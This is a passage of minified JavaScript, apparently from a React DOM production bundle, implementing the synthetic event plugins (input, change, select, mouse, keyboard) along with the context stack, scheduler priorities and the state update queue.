                    (d = !d.disabled) || (d = !("button" === (a = a.type) || "input" === a || "select" === a || "textarea" === a)), (a = !d);
                    break a;
                default:
                    a = !1;
            }
            if (a) return null;
            if (c && "function" != typeof c) throw Error(u(231, b, typeof c));
            return c;
        }
        function Td(a, b, c) {
            (b = Sd(a, c.dispatchConfig.phasedRegistrationNames[b])) && ((c._dispatchListeners = ic(c._dispatchListeners, b)), (c._dispatchInstances = ic(c._dispatchInstances, a)));
        }
        function Ud(a) {
            if (a && a.dispatchConfig.phasedRegistrationNames) {
                for (var b = a._targetInst, c = []; b; ) c.push(b), (b = Rd(b));
                for (b = c.length; 0 < b--; ) Td(c[b], "captured", a);
                for (b = 0; b < c.length; b++) Td(c[b], "bubbled", a);
            }
        }
        function Vd(a, b, c) {
            a && c && c.dispatchConfig.registrationName && (b = Sd(a, c.dispatchConfig.registrationName)) && ((c._dispatchListeners = ic(c._dispatchListeners, b)), (c._dispatchInstances = ic(c._dispatchInstances, a)));
        }
        function Wd(a) {
            a && a.dispatchConfig.registrationName && Vd(a._targetInst, null, a);
        }
        function Xd(a) {
            jc(a, Ud);
        }
        var Yd = null,
            Zd = null,
            $d = null;
        function ae() {
            if ($d) return $d;
            var a,
                d,
                b = Zd,
                c = b.length,
                e = "value" in Yd ? Yd.value : Yd.textContent,
                f = e.length;
            for (a = 0; a < c && b[a] === e[a]; a++);
            var g = c - a;
            for (d = 1; d <= g && b[c - d] === e[f - d]; d++);
            return ($d = e.slice(a, 1 < d ? 1 - d : void 0));
        }
        function be() {
            return !0;
        }
        function ce() {
            return !1;
        }
        function G(a, b, c, d) {
            for (var e in ((this.dispatchConfig = a), (this._targetInst = b), (this.nativeEvent = c), (a = this.constructor.Interface)))
                a.hasOwnProperty(e) && ((b = a[e]) ? (this[e] = b(c)) : "target" === e ? (this.target = d) : (this[e] = c[e]));
            return (this.isDefaultPrevented = (null != c.defaultPrevented ? c.defaultPrevented : !1 === c.returnValue) ? be : ce), (this.isPropagationStopped = ce), this;
        }
        function ee(a, b, c, d) {
            if (this.eventPool.length) {
                var e = this.eventPool.pop();
                return this.call(e, a, b, c, d), e;
            }
            return new this(a, b, c, d);
        }
        function fe(a) {
            if (!(a instanceof this)) throw Error(u(279));
            a.destructor(), 10 > this.eventPool.length && this.eventPool.push(a);
        }
        function de(a) {
            (a.eventPool = []), (a.getPooled = ee), (a.release = fe);
        }
        n(G.prototype, {
            preventDefault: function () {
                this.defaultPrevented = !0;
                var a = this.nativeEvent;
                a && (a.preventDefault ? a.preventDefault() : "unknown" != typeof a.returnValue && (a.returnValue = !1), (this.isDefaultPrevented = be));
            },
            stopPropagation: function () {
                var a = this.nativeEvent;
                a && (a.stopPropagation ? a.stopPropagation() : "unknown" != typeof a.cancelBubble && (a.cancelBubble = !0), (this.isPropagationStopped = be));
            },
            persist: function () {
                this.isPersistent = be;
            },
            isPersistent: ce,
            destructor: function () {
                var b,
                    a = this.constructor.Interface;
                for (b in a) this[b] = null;
                (this.nativeEvent = this._targetInst = this.dispatchConfig = null), (this.isPropagationStopped = this.isDefaultPrevented = ce), (this._dispatchInstances = this._dispatchListeners = null);
            },
        }),
            (G.Interface = {
                type: null,
                target: null,
                currentTarget: function () {
                    return null;
                },
                eventPhase: null,
                bubbles: null,
                cancelable: null,
                timeStamp: function (a) {
                    return a.timeStamp || Date.now();
                },
                defaultPrevented: null,
                isTrusted: null,
            }),
            (G.extend = function (a) {
                function b() {}
                function c() {
                    return d.apply(this, arguments);
                }
                var d = this;
                b.prototype = d.prototype;
                var e = new b();
                return n(e, c.prototype), (c.prototype = e), (c.prototype.constructor = c), (c.Interface = n({}, d.Interface, a)), (c.extend = d.extend), de(c), c;
            }),
            de(G);
        var ge = G.extend({ data: null }),
            he = G.extend({ data: null }),
            ie = [9, 13, 27, 32],
            je = ya && "CompositionEvent" in window,
            ke = null;
        ya && "documentMode" in document && (ke = document.documentMode);
        var le = ya && "TextEvent" in window && !ke,
            me = ya && (!je || (ke && 8 < ke && 11 >= ke)),
            ne = String.fromCharCode(32),
            oe = {
                beforeInput: { phasedRegistrationNames: { bubbled: "onBeforeInput", captured: "onBeforeInputCapture" }, dependencies: ["compositionend", "keypress", "textInput", "paste"] },
                compositionEnd: { phasedRegistrationNames: { bubbled: "onCompositionEnd", captured: "onCompositionEndCapture" }, dependencies: "blur compositionend keydown keypress keyup mousedown".split(" ") },
                compositionStart: { phasedRegistrationNames: { bubbled: "onCompositionStart", captured: "onCompositionStartCapture" }, dependencies: "blur compositionstart keydown keypress keyup mousedown".split(" ") },
                compositionUpdate: { phasedRegistrationNames: { bubbled: "onCompositionUpdate", captured: "onCompositionUpdateCapture" }, dependencies: "blur compositionupdate keydown keypress keyup mousedown".split(" ") },
            },
            pe = !1;
        function qe(a, b) {
            switch (a) {
                case "keyup":
                    return -1 !== ie.indexOf(b.keyCode);
                case "keydown":
                    return 229 !== b.keyCode;
                case "keypress":
                case "mousedown":
                case "blur":
                    return !0;
                default:
                    return !1;
            }
        }
        function re(a) {
            return "object" == typeof (a = a.detail) && "data" in a ? a.data : null;
        }
        var se = !1;
        var ve = {
                eventTypes: oe,
                extractEvents: function (a, b, c, d) {
                    var e;
                    if (je)
                        b: {
                            switch (a) {
                                case "compositionstart":
                                    var f = oe.compositionStart;
                                    break b;
                                case "compositionend":
                                    f = oe.compositionEnd;
                                    break b;
                                case "compositionupdate":
                                    f = oe.compositionUpdate;
                                    break b;
                            }
                            f = void 0;
                        }
                    else se ? qe(a, c) && (f = oe.compositionEnd) : "keydown" === a && 229 === c.keyCode && (f = oe.compositionStart);
                    return (
                        f
                            ? (me && "ko" !== c.locale && (se || f !== oe.compositionStart ? f === oe.compositionEnd && se && (e = ae()) : ((Zd = "value" in (Yd = d) ? Yd.value : Yd.textContent), (se = !0))),
                              (f = ge.getPooled(f, b, c, d)),
                              e ? (f.data = e) : null !== (e = re(c)) && (f.data = e),
                              Xd(f),
                              (e = f))
                            : (e = null),
                        (a = le
                            ? (function (a, b) {
                                  switch (a) {
                                      case "compositionend":
                                          return re(b);
                                      case "keypress":
                                          return 32 !== b.which ? null : ((pe = !0), ne);
                                      case "textInput":
                                          return (a = b.data) === ne && pe ? null : a;
                                      default:
                                          return null;
                                  }
                              })(a, c)
                            : (function (a, b) {
                                  if (se) return "compositionend" === a || (!je && qe(a, b)) ? ((a = ae()), ($d = Zd = Yd = null), (se = !1), a) : null;
                                  switch (a) {
                                      case "paste":
                                          return null;
                                      case "keypress":
                                          if (!(b.ctrlKey || b.altKey || b.metaKey) || (b.ctrlKey && b.altKey)) {
                                              if (b.char && 1 < b.char.length) return b.char;
                                              if (b.which) return String.fromCharCode(b.which);
                                          }
                                          return null;
                                      case "compositionend":
                                          return me && "ko" !== b.locale ? null : b.data;
                                      default:
                                          return null;
                                  }
                              })(a, c))
                            ? (((b = he.getPooled(oe.beforeInput, b, c, d)).data = a), Xd(b))
                            : (b = null),
                        null === e ? b : null === b ? e : [e, b]
                    );
                },
            },
            we = { color: !0, date: !0, datetime: !0, "datetime-local": !0, email: !0, month: !0, number: !0, password: !0, range: !0, search: !0, tel: !0, text: !0, time: !0, url: !0, week: !0 };
        function xe(a) {
            var b = a && a.nodeName && a.nodeName.toLowerCase();
            return "input" === b ? !!we[a.type] : "textarea" === b;
        }
        var ye = { change: { phasedRegistrationNames: { bubbled: "onChange", captured: "onChangeCapture" }, dependencies: "blur change click focus input keydown keyup selectionchange".split(" ") } };
        function ze(a, b, c) {
            return ((a = G.getPooled(ye.change, a, b, c)).type = "change"), Da(c), Xd(a), a;
        }
        var Ae = null,
            Be = null;
        function Ce(a) {
            mc(a);
        }
        function De(a) {
            if (yb(Pd(a))) return a;
        }
        function Ee(a, b) {
            if ("change" === a) return b;
        }
        var Fe = !1;
        function Ge() {
            Ae && (Ae.detachEvent("onpropertychange", He), (Be = Ae = null));
        }
        function He(a) {
            if ("value" === a.propertyName && De(Be))
                if (((a = ze(Be, a, nc(a))), Ja)) mc(a);
                else {
                    Ja = !0;
                    try {
                        Fa(Ce, a);
                    } finally {
                        (Ja = !1), La();
                    }
                }
        }
        function Ie(a, b, c) {
            "focus" === a ? (Ge(), (Be = c), (Ae = b).attachEvent("onpropertychange", He)) : "blur" === a && Ge();
        }
        function Je(a) {
            if ("selectionchange" === a || "keyup" === a || "keydown" === a) return De(Be);
        }
        function Ke(a, b) {
            if ("click" === a) return De(b);
        }
        function Le(a, b) {
            if ("input" === a || "change" === a) return De(b);
        }
        ya && (Fe = oc("input") && (!document.documentMode || 9 < document.documentMode));
        var Me = {
                eventTypes: ye,
                _isInputEventSupported: Fe,
                extractEvents: function (a, b, c, d) {
                    var e = b ? Pd(b) : window,
                        f = e.nodeName && e.nodeName.toLowerCase();
                    if ("select" === f || ("input" === f && "file" === e.type)) var g = Ee;
                    else if (xe(e))
                        if (Fe) g = Le;
                        else {
                            g = Je;
                            var h = Ie;
                        }
                    else (f = e.nodeName) && "input" === f.toLowerCase() && ("checkbox" === e.type || "radio" === e.type) && (g = Ke);
                    if (g && (g = g(a, b))) return ze(g, c, d);
                    h && h(a, e, b), "blur" === a && (a = e._wrapperState) && a.controlled && "number" === e.type && Db(e, "number", e.value);
                },
            },
            Ne = G.extend({ view: null, detail: null }),
            Oe = { Alt: "altKey", Control: "ctrlKey", Meta: "metaKey", Shift: "shiftKey" };
        function Pe(a) {
            var b = this.nativeEvent;
            return b.getModifierState ? b.getModifierState(a) : !!(a = Oe[a]) && !!b[a];
        }
        function Qe() {
            return Pe;
        }
        var Re = 0,
            Se = 0,
            Te = !1,
            Ue = !1,
            Ve = Ne.extend({
                screenX: null,
                screenY: null,
                clientX: null,
                clientY: null,
                pageX: null,
                pageY: null,
                ctrlKey: null,
                shiftKey: null,
                altKey: null,
                metaKey: null,
                getModifierState: Qe,
                button: null,
                buttons: null,
                relatedTarget: function (a) {
                    return a.relatedTarget || (a.fromElement === a.srcElement ? a.toElement : a.fromElement);
                },
                movementX: function (a) {
                    if ("movementX" in a) return a.movementX;
                    var b = Re;
                    return (Re = a.screenX), Te ? ("mousemove" === a.type ? a.screenX - b : 0) : ((Te = !0), 0);
                },
                movementY: function (a) {
                    if ("movementY" in a) return a.movementY;
                    var b = Se;
                    return (Se = a.screenY), Ue ? ("mousemove" === a.type ? a.screenY - b : 0) : ((Ue = !0), 0);
                },
            }),
            We = Ve.extend({ pointerId: null, width: null, height: null, pressure: null, tangentialPressure: null, tiltX: null, tiltY: null, twist: null, pointerType: null, isPrimary: null }),
            Xe = {
                mouseEnter: { registrationName: "onMouseEnter", dependencies: ["mouseout", "mouseover"] },
                mouseLeave: { registrationName: "onMouseLeave", dependencies: ["mouseout", "mouseover"] },
                pointerEnter: { registrationName: "onPointerEnter", dependencies: ["pointerout", "pointerover"] },
                pointerLeave: { registrationName: "onPointerLeave", dependencies: ["pointerout", "pointerover"] },
            },
            Ye = {
                eventTypes: Xe,
                extractEvents: function (a, b, c, d, e) {
                    var f = "mouseover" === a || "pointerover" === a,
                        g = "mouseout" === a || "pointerout" === a;
                    if ((f && 0 == (32 & e) && (c.relatedTarget || c.fromElement)) || (!g && !f)) return null;
                    ((f = d.window === d ? d : (f = d.ownerDocument) ? f.defaultView || f.parentWindow : window), g)
                        ? ((g = b), null !== (b = (b = c.relatedTarget || c.toElement) ? tc(b) : null) && (b !== dc(b) || (5 !== b.tag && 6 !== b.tag)) && (b = null))
                        : (g = null);
                    if (g === b) return null;
                    if ("mouseout" === a || "mouseover" === a)
                        var k = Ve,
                            l = Xe.mouseLeave,
                            m = Xe.mouseEnter,
                            p = "mouse";
                    else ("pointerout" !== a && "pointerover" !== a) || ((k = We), (l = Xe.pointerLeave), (m = Xe.pointerEnter), (p = "pointer"));
                    if (
                        ((a = null == g ? f : Pd(g)),
                        (f = null == b ? f : Pd(b)),
                        ((l = k.getPooled(l, g, c, d)).type = p + "leave"),
                        (l.target = a),
                        (l.relatedTarget = f),
                        ((c = k.getPooled(m, b, c, d)).type = p + "enter"),
                        (c.target = f),
                        (c.relatedTarget = a),
                        (p = b),
                        (d = g) && p)
                    )
                        a: {
                            for (m = p, g = 0, a = k = d; a; a = Rd(a)) g++;
                            for (a = 0, b = m; b; b = Rd(b)) a++;
                            for (; 0 < g - a; ) (k = Rd(k)), g--;
                            for (; 0 < a - g; ) (m = Rd(m)), a--;
                            for (; g--; ) {
                                if (k === m || k === m.alternate) break a;
                                (k = Rd(k)), (m = Rd(m));
                            }
                            k = null;
                        }
                    else k = null;
                    for (m = k, k = []; d && d !== m && (null === (g = d.alternate) || g !== m); ) k.push(d), (d = Rd(d));
                    for (d = []; p && p !== m && (null === (g = p.alternate) || g !== m); ) d.push(p), (p = Rd(p));
                    for (p = 0; p < k.length; p++) Vd(k[p], "bubbled", l);
                    for (p = d.length; 0 < p--; ) Vd(d[p], "captured", c);
                    return 0 == (64 & e) ? [l] : [l, c];
                },
            };
        var $e =
                "function" == typeof Object.is
                    ? Object.is
                    : function (a, b) {
                          return (a === b && (0 !== a || 1 / a == 1 / b)) || (a != a && b != b);
                      },
            af = Object.prototype.hasOwnProperty;
        function bf(a, b) {
            if ($e(a, b)) return !0;
            if ("object" != typeof a || null === a || "object" != typeof b || null === b) return !1;
            var c = Object.keys(a),
                d = Object.keys(b);
            if (c.length !== d.length) return !1;
            for (d = 0; d < c.length; d++) if (!af.call(b, c[d]) || !$e(a[c[d]], b[c[d]])) return !1;
            return !0;
        }
        var cf = ya && "documentMode" in document && 11 >= document.documentMode,
            df = { select: { phasedRegistrationNames: { bubbled: "onSelect", captured: "onSelectCapture" }, dependencies: "blur contextmenu dragend focus keydown keyup mousedown mouseup selectionchange".split(" ") } },
            ef = null,
            ff = null,
            gf = null,
            hf = !1;
        function jf(a, b) {
            var c = b.window === b ? b.document : 9 === b.nodeType ? b : b.ownerDocument;
            return hf || null == ef || ef !== td(c)
                ? null
                : ("selectionStart" in (c = ef) && yd(c)
                      ? (c = { start: c.selectionStart, end: c.selectionEnd })
                      : (c = { anchorNode: (c = ((c.ownerDocument && c.ownerDocument.defaultView) || window).getSelection()).anchorNode, anchorOffset: c.anchorOffset, focusNode: c.focusNode, focusOffset: c.focusOffset }),
                  gf && bf(gf, c) ? null : ((gf = c), ((a = G.getPooled(df.select, ff, a, b)).type = "select"), (a.target = ef), Xd(a), a));
        }
        var kf = {
                eventTypes: df,
                extractEvents: function (a, b, c, d, e, f) {
                    if (!(f = !(e = f || (d.window === d ? d.document : 9 === d.nodeType ? d : d.ownerDocument)))) {
                        a: {
                            (e = cc(e)), (f = wa.onSelect);
                            for (var g = 0; g < f.length; g++)
                                if (!e.has(f[g])) {
                                    e = !1;
                                    break a;
                                }
                            e = !0;
                        }
                        f = !e;
                    }
                    if (f) return null;
                    switch (((e = b ? Pd(b) : window), a)) {
                        case "focus":
                            (xe(e) || "true" === e.contentEditable) && ((ef = e), (ff = b), (gf = null));
                            break;
                        case "blur":
                            gf = ff = ef = null;
                            break;
                        case "mousedown":
                            hf = !0;
                            break;
                        case "contextmenu":
                        case "mouseup":
                        case "dragend":
                            return (hf = !1), jf(c, d);
                        case "selectionchange":
                            if (cf) break;
                        case "keydown":
                        case "keyup":
                            return jf(c, d);
                    }
                    return null;
                },
            },
            lf = G.extend({ animationName: null, elapsedTime: null, pseudoElement: null }),
            mf = G.extend({
                clipboardData: function (a) {
                    return "clipboardData" in a ? a.clipboardData : window.clipboardData;
                },
            }),
            nf = Ne.extend({ relatedTarget: null });
        function of(a) {
            var b = a.keyCode;
            return "charCode" in a ? 0 === (a = a.charCode) && 13 === b && (a = 13) : (a = b), 10 === a && (a = 13), 32 <= a || 13 === a ? a : 0;
        }
        var pf = {
                Esc: "Escape",
                Spacebar: " ",
                Left: "ArrowLeft",
                Up: "ArrowUp",
                Right: "ArrowRight",
                Down: "ArrowDown",
                Del: "Delete",
                Win: "OS",
                Menu: "ContextMenu",
                Apps: "ContextMenu",
                Scroll: "ScrollLock",
                MozPrintableKey: "Unidentified",
            },
            qf = {
                8: "Backspace",
                9: "Tab",
                12: "Clear",
                13: "Enter",
                16: "Shift",
                17: "Control",
                18: "Alt",
                19: "Pause",
                20: "CapsLock",
                27: "Escape",
                32: " ",
                33: "PageUp",
                34: "PageDown",
                35: "End",
                36: "Home",
                37: "ArrowLeft",
                38: "ArrowUp",
                39: "ArrowRight",
                40: "ArrowDown",
                45: "Insert",
                46: "Delete",
                112: "F1",
                113: "F2",
                114: "F3",
                115: "F4",
                116: "F5",
                117: "F6",
                118: "F7",
                119: "F8",
                120: "F9",
                121: "F10",
                122: "F11",
                123: "F12",
                144: "NumLock",
                145: "ScrollLock",
                224: "Meta",
            },
            rf = Ne.extend({
                key: function (a) {
                    if (a.key) {
                        var b = pf[a.key] || a.key;
                        if ("Unidentified" !== b) return b;
                    }
                    return "keypress" === a.type ? (13 === (a = of(a)) ? "Enter" : String.fromCharCode(a)) : "keydown" === a.type || "keyup" === a.type ? qf[a.keyCode] || "Unidentified" : "";
                },
                location: null,
                ctrlKey: null,
                shiftKey: null,
                altKey: null,
                metaKey: null,
                repeat: null,
                locale: null,
                getModifierState: Qe,
                charCode: function (a) {
                    return "keypress" === a.type ? of(a) : 0;
                },
                keyCode: function (a) {
                    return "keydown" === a.type || "keyup" === a.type ? a.keyCode : 0;
                },
                which: function (a) {
                    return "keypress" === a.type ? of(a) : "keydown" === a.type || "keyup" === a.type ? a.keyCode : 0;
                },
            }),
            sf = Ve.extend({ dataTransfer: null }),
            tf = Ne.extend({ touches: null, targetTouches: null, changedTouches: null, altKey: null, metaKey: null, ctrlKey: null, shiftKey: null, getModifierState: Qe }),
            uf = G.extend({ propertyName: null, elapsedTime: null, pseudoElement: null }),
            vf = Ve.extend({
                deltaX: function (a) {
                    return "deltaX" in a ? a.deltaX : "wheelDeltaX" in a ? -a.wheelDeltaX : 0;
                },
                deltaY: function (a) {
                    return "deltaY" in a ? a.deltaY : "wheelDeltaY" in a ? -a.wheelDeltaY : "wheelDelta" in a ? -a.wheelDelta : 0;
                },
                deltaZ: null,
                deltaMode: null,
            }),
            wf = {
                eventTypes: Wc,
                extractEvents: function (a, b, c, d) {
                    var e = Yc.get(a);
                    if (!e) return null;
                    switch (a) {
                        case "keypress":
                            if (0 === of(c)) return null;
                        case "keydown":
                        case "keyup":
                            a = rf;
                            break;
                        case "blur":
                        case "focus":
                            a = nf;
                            break;
                        case "click":
                            if (2 === c.button) return null;
                        case "auxclick":
                        case "dblclick":
                        case "mousedown":
                        case "mousemove":
                        case "mouseup":
                        case "mouseout":
                        case "mouseover":
                        case "contextmenu":
                            a = Ve;
                            break;
                        case "drag":
                        case "dragend":
                        case "dragenter":
                        case "dragexit":
                        case "dragleave":
                        case "dragover":
                        case "dragstart":
                        case "drop":
                            a = sf;
                            break;
                        case "touchcancel":
                        case "touchend":
                        case "touchmove":
                        case "touchstart":
                            a = tf;
                            break;
                        case Xb:
                        case Yb:
                        case Zb:
                            a = lf;
                            break;
                        case $b:
                            a = uf;
                            break;
                        case "scroll":
                            a = Ne;
                            break;
                        case "wheel":
                            a = vf;
                            break;
                        case "copy":
                        case "cut":
                        case "paste":
                            a = mf;
                            break;
                        case "gotpointercapture":
                        case "lostpointercapture":
                        case "pointercancel":
                        case "pointerdown":
                        case "pointermove":
                        case "pointerout":
                        case "pointerover":
                        case "pointerup":
                            a = We;
                            break;
                        default:
                            a = G;
                    }
                    return Xd((b = a.getPooled(e, b, c, d))), b;
                },
            };
        if (pa) throw Error(u(101));
        (pa = Array.prototype.slice.call("ResponderEventPlugin SimpleEventPlugin EnterLeaveEventPlugin ChangeEventPlugin SelectEventPlugin BeforeInputEventPlugin".split(" "))),
            ra(),
            (la = Qd),
            (ma = Nc),
            (na = Pd),
            xa({ SimpleEventPlugin: wf, EnterLeaveEventPlugin: Ye, ChangeEventPlugin: Me, SelectEventPlugin: kf, BeforeInputEventPlugin: ve });
        var yf = [],
            zf = -1;
        function H(a) {
            0 > zf || ((a.current = yf[zf]), (yf[zf] = null), zf--);
        }
        function I(a, b) {
            zf++, (yf[zf] = a.current), (a.current = b);
        }
        var Af = {},
            J = { current: Af },
            K = { current: !1 },
            Bf = Af;
        function Cf(a, b) {
            var c = a.type.contextTypes;
            if (!c) return Af;
            var d = a.stateNode;
            if (d && d.__reactInternalMemoizedUnmaskedChildContext === b) return d.__reactInternalMemoizedMaskedChildContext;
            var f,
                e = {};
            for (f in c) e[f] = b[f];
            return d && (((a = a.stateNode).__reactInternalMemoizedUnmaskedChildContext = b), (a.__reactInternalMemoizedMaskedChildContext = e)), e;
        }
        function L(a) {
            return null != (a = a.childContextTypes);
        }
        function Df() {
            H(K), H(J);
        }
        function Ef(a, b, c) {
            if (J.current !== Af) throw Error(u(168));
            I(J, b), I(K, c);
        }
        function Ff(a, b, c) {
            var d = a.stateNode;
            if (((a = b.childContextTypes), "function" != typeof d.getChildContext)) return c;
            for (var e in (d = d.getChildContext())) if (!(e in a)) throw Error(u(108, pb(b) || "Unknown", e));
            return n({}, c, {}, d);
        }
        function Gf(a) {
            return (a = ((a = a.stateNode) && a.__reactInternalMemoizedMergedChildContext) || Af), (Bf = J.current), I(J, a), I(K, K.current), !0;
        }
        function Hf(a, b, c) {
            var d = a.stateNode;
            if (!d) throw Error(u(169));
            c ? ((a = Ff(a, b, Bf)), (d.__reactInternalMemoizedMergedChildContext = a), H(K), H(J), I(J, a)) : H(K), I(K, c);
        }
        var If = r.unstable_runWithPriority,
            Jf = r.unstable_scheduleCallback,
            Kf = r.unstable_cancelCallback,
            Lf = r.unstable_requestPaint,
            Mf = r.unstable_now,
            Nf = r.unstable_getCurrentPriorityLevel,
            Of = r.unstable_ImmediatePriority,
            Pf = r.unstable_UserBlockingPriority,
            Qf = r.unstable_NormalPriority,
            Rf = r.unstable_LowPriority,
            Sf = r.unstable_IdlePriority,
            Tf = {},
            Uf = r.unstable_shouldYield,
            Vf = void 0 !== Lf ? Lf : function () {},
            Wf = null,
            Xf = null,
            Yf = !1,
            Zf = Mf(),
            $f =
                1e4 > Zf
                    ? Mf
                    : function () {
                          return Mf() - Zf;
                      };
        function ag() {
            switch (Nf()) {
                case Of:
                    return 99;
                case Pf:
                    return 98;
                case Qf:
                    return 97;
                case Rf:
                    return 96;
                case Sf:
                    return 95;
                default:
                    throw Error(u(332));
            }
        }
        function bg(a) {
            switch (a) {
                case 99:
                    return Of;
                case 98:
                    return Pf;
                case 97:
                    return Qf;
                case 96:
                    return Rf;
                case 95:
                    return Sf;
                default:
                    throw Error(u(332));
            }
        }
        function cg(a, b) {
            return (a = bg(a)), If(a, b);
        }
        function dg(a, b, c) {
            return (a = bg(a)), Jf(a, b, c);
        }
        function eg(a) {
            return null === Wf ? ((Wf = [a]), (Xf = Jf(Of, fg))) : Wf.push(a), Tf;
        }
        function gg() {
            if (null !== Xf) {
                var a = Xf;
                (Xf = null), Kf(a);
            }
            fg();
        }
        function fg() {
            if (!Yf && null !== Wf) {
                Yf = !0;
                var a = 0;
                try {
                    var b = Wf;
                    cg(99, function () {
                        for (; a < b.length; a++) {
                            var c = b[a];
                            do {
                                c = c(!0);
                            } while (null !== c);
                        }
                    }),
                        (Wf = null);
                } catch (c) {
                    throw (null !== Wf && (Wf = Wf.slice(a + 1)), Jf(Of, gg), c);
                } finally {
                    Yf = !1;
                }
            }
        }
        function hg(a, b, c) {
            return 1073741821 - (1 + (((1073741821 - a + b / 10) / (c /= 10)) | 0)) * c;
        }
        function ig(a, b) {
            if (a && a.defaultProps) for (var c in ((b = n({}, b)), (a = a.defaultProps))) void 0 === b[c] && (b[c] = a[c]);
            return b;
        }
        var jg = { current: null },
            kg = null,
            lg = null,
            mg = null;
        function ng() {
            mg = lg = kg = null;
        }
        function og(a) {
            var b = jg.current;
            H(jg), (a.type._context._currentValue = b);
        }
        function pg(a, b) {
            for (; null !== a; ) {
                var c = a.alternate;
                if (a.childExpirationTime < b) (a.childExpirationTime = b), null !== c && c.childExpirationTime < b && (c.childExpirationTime = b);
                else {
                    if (!(null !== c && c.childExpirationTime < b)) break;
                    c.childExpirationTime = b;
                }
                a = a.return;
            }
        }
        function qg(a, b) {
            (kg = a), (mg = lg = null), null !== (a = a.dependencies) && null !== a.firstContext && (a.expirationTime >= b && (rg = !0), (a.firstContext = null));
        }
        function sg(a, b) {
            if (mg !== a && !1 !== b && 0 !== b)
                if ((("number" == typeof b && 1073741823 !== b) || ((mg = a), (b = 1073741823)), (b = { context: a, observedBits: b, next: null }), null === lg)) {
                    if (null === kg) throw Error(u(308));
                    (lg = b), (kg.dependencies = { expirationTime: 0, firstContext: b, responders: null });
                } else lg = lg.next = b;
            return a._currentValue;
        }
        var tg = !1;
        function ug(a) {
            a.updateQueue = { baseState: a.memoizedState, baseQueue: null, shared: { pending: null }, effects: null };
        }
        function vg(a, b) {
            (a = a.updateQueue), b.updateQueue === a && (b.updateQueue = { baseState: a.baseState, baseQueue: a.baseQueue, shared: a.shared, effects: a.effects });
        }
        function wg(a, b) {
            return ((a = { expirationTime: a, suspenseConfig: b, tag: 0, payload: null, callback: null, next: null }).next = a);
        }
        function xg(a, b) {
            if (null !== (a = a.updateQueue)) {
                var c = (a = a.shared).pending;
                null === c ? (b.next = b) : ((b.next = c.next), (c.next = b)), (a.pending = b);
            }
        }
        function yg(a, b) {
            var c = a.alternate;
            null !== c && vg(c, a), null === (c = (a = a.updateQueue).baseQueue) ? ((a.baseQueue = b.next = b), (b.next = b)) : ((b.next = c.next), (c.next = b));
        }
        function zg(a, b, c, d) {
            var e = a.updateQueue;
            tg = !1;
            var f = e.baseQueue,
                g = e.shared.pending;
            if (null !== g) {
                if (null !== f) {
                    var h = f.next;
                    (f.next = g.next), (g.next = h);
                }
                (f = g), (e.shared.pending = null), null !== (h = a.alternate) && null !== (h = h.updateQueue) && (h.baseQueue = g);
            }
            if (null !== f) {
                h = f.next;
                var k = e.baseState,
                    l = 0,
                    m = null,
                    p = null,
                    x = null;
                if (null !== h)
                    for (var z = h; ; ) {
                        if ((g = z.expirationTime) < d) {
                            var ca = { expirationTime: z.expirationTime, suspenseConfig: z.suspenseConfig, tag: z.tag, payload: z.payload, callback: z.callback, next: null };
                            null === x ? ((p = x = ca), (m = k)) : (x = x.next = ca), g > l && (l = g);
                        } else {
                            null !== x && (x = x.next = { expirationTime: 1073741823, suspenseConfig: z.suspenseConfig, tag: z.tag, payload: z.payload, callback: z.callback, next: null }), Ag(g, z.suspenseConfig);
                            a: {
                                var D = a,
                                    t = z;
                                switch (((g = b), (ca = c), t.tag)) {
                                    case 1:
                                        if ("function" == typeof (D = t.payload)) {
                                            k = D.call(ca, k, g);
                                            break a;
                                        }
                                        k = D;
                                        break a;
                                    case 3:
                                        D.effectTag = (-4097 & D.effectTag) | 64;
                                    case 0:
                                        if (null == (g = "function" == typeof (D = t.payload) ? D.call(ca, k, g) : D)) break a;
                                        k = n({}, k, g);
                                        break a;
                                    case 2:
                                        tg = !0;
                                }
                            }
                            null !== z.callback && ((a.effectTag |= 32), null === (g = e.effects) ? (e.effects = [z]) : g.push(z));
                        }
                        if (null === (z = z.next) || z === h) {
                            if (null === (g = e.shared.pending)) break;
                            (z = f.next = g.next), (g.next = h), (e.baseQueue = f = g), (e.shared.pending = null);
                        }
                    }
                null === x ? (m = k) : (x.next = p), (e.baseState = m), (e.baseQueue = x), Bg(l), (a.expirationTime = l), (a.memoizedState = k);
            }
        }
        function Cg(a, b, c) {
            if (((a = b.effects), (b.effects = null), null !== a))
                for (b = 0; b < a.length; b++) {
                    var d = a[b],
                        e = d.callback;
                    if (null !== e) {
                        if (((d.callback = null), (d = e), (e = c), "function" != typeof d)) throw Error(u(191, d));
                        d.call(e);
                    }
                }
        }
        var Dg = Wa.ReactCurrentBatchConfig,
            Eg = new aa.Component().refs;
        function Fg(a, b, c, d) {
            (c = null == (c = c(d, (b = a.memoizedState))) ? b : n({}, b, c)), (a.memoizedState = c), 0 === a.expirationTime && (a.updateQueue.baseState = c);
        }
        var Jg = {
            isMounted: function (a) {
                return !!(a = a._reactInternalFiber) && dc(a) === a;
            },
            enqueueSetState: function (a, b, c) {
                a = a._reactInternalFiber;
                var d = Gg(),
                    e = Dg.suspense;
                ((e = wg((d = Hg(d, a, e)), e)).payload = b), null != c && (e.callback = c), xg(a, e), Ig(a, d);
            },
            enqueueReplaceState: function (a, b, c) {
                a = a._reactInternalFiber;
                var d = Gg(),
                    e = Dg.suspense;
                ((e = wg((d = Hg(d, a, e)), e)).tag = 1), (e.payload = b), null != c && (e.callback = c), xg(a, e), Ig(a, d);
            },
            enqueueForceUpdate: function (a, b) {
                a = a._reactInternalFiber;
                var c = Gg(),
                    d = Dg.suspense;
                ((d = wg((c = Hg(c, a, d)), d)).tag = 2), null != b && (d.callback = b), xg(a, d), Ig(a, c);
            },
        };
        function Kg(a, b, c, d, e, f, g) {
            return "function" == typeof (a = a.stateNode).shouldComponentUpdate ? a.shouldComponentUpdate(d, f, g) : !b.prototype || !b.prototype.isPureReactComponent || !bf(c, d) || !bf(e, f);
        }
        function Lg(a, b, c) {
            var d = !1,
                e = Af,
                f = b.contextType;
            return (
                "object" == typeof f && null !== f ? (f = sg(f)) : ((e = L(b) ? Bf : J.current), (f = (d = null != (d = b.contextTypes)) ? Cf(a, e) : Af)),
                (b = new b(c, f)),
                (a.memoizedState = null !== b.state && void 0 !== b.state ? b.state : null),
                (b.updater = Jg),
                (a.stateNode = b),
                (b._reactInternalFiber = a),
                d && (((a = a.stateNode).__reactInternalMemoizedUnmaskedChildContext = e), (a.__reactInternalMemoizedMaskedChildContext = f)),
                b
            );
        }
        function Mg(a, b, c, d) {
            (a = b.state),
